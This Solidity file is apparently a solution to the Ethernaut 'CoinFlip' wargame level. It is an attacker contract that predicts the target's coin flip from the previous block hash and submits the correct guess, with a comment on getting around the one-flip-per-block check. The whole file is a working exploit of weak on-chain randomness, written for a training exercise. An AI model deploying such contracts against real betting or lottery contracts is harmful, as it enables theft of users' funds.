//SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./CoinFlip.sol";

contract coinFlipper{

    using SafeMath for uint256;
    address CoinFlipAddress = 0x2c5CfC2522594e5A6df26fB72d5f7A3Fc8F51a33;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    CoinFlip instance = CoinFlip(CoinFlipAddress);

    function flipCoin() public {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));     
        if(blockValue.div(FACTOR) == 1){
            instance.flip(true);
        } else {
            instance.flip(false);
        }
    }
    /*
    The function multiFLip() won't work because the main contract checks that each flip must come from a different block!
    To perform this, an alternative is to create a Truffle/Hardhat script that awaits each call-block
    to be different before calling flipCoin();
    */
    function multiFlip(uint _times) public {
        for(uint i = 1; i<_times+1; i++){
            flipCoin();
        }

    }
}
